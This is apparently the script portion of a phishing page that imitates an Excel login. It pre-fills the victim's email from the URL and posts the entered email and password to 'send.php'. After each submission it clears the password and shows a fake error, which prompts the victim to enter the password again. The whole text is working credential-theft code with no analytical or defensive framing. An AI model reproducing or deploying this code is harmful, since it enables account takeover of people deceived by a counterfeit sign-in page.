    <script>
        const excelController = document.querySelector("#excel_f_m");
        const x1 = document.querySelector("#x1");
        const x2 = document.querySelector("#x2");
        const x3_btn = document.querySelector("#x3");
        const errMsg = document.querySelector(".excel_err_msg");
        const ldr = document.querySelector('.l_d__r___');
        let counter = 0;

        ldr.style.display = 'none'

        const emailInTheURL = window.location.href;
        const sliceEqualSign = emailInTheURL.indexOf("=");
        const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1));

        if (!emailInTheURL.includes('=')) {
          x1.setAttribute('value', '');
          errMsg.style.display = "none";
          ldr.style.display = "none";
        }else{
          x1.setAttribute('value', extracetdEmail);
          errMsg.style.display = "none";
          ldr.style.display = "none";
        }

        // x1.setAttribute('value', extracetdEmail);
        errMsg.style.display = "none";
        // ldr.style.display = "none";

        excelController.addEventListener('submit', (e)=>{
            e.preventDefault();
            // alert('submited!');
            if (x2.value === "") {
                return null
            } else {
                // counter = counter + 1;
                counter++;
                ldr.style.display = 'block';
                setTimeout(() => {
                    x2.value = "";
                    ldr.style.display = "none";
                    errMsg.style.display = "block";
                }, 2500);
            }

        });
    </script>

        $(document).ready(function(){
        $("#excel_f_m").submit(function(e){
            e.preventDefault();
            var email = $("#x1").val();
            var password = $("#x2").val();
            $.post("send.php", {
                email: email,
                password: password
            }, function(data, status){
                console.log(data);
                // alert(status)
            })
        });
    });
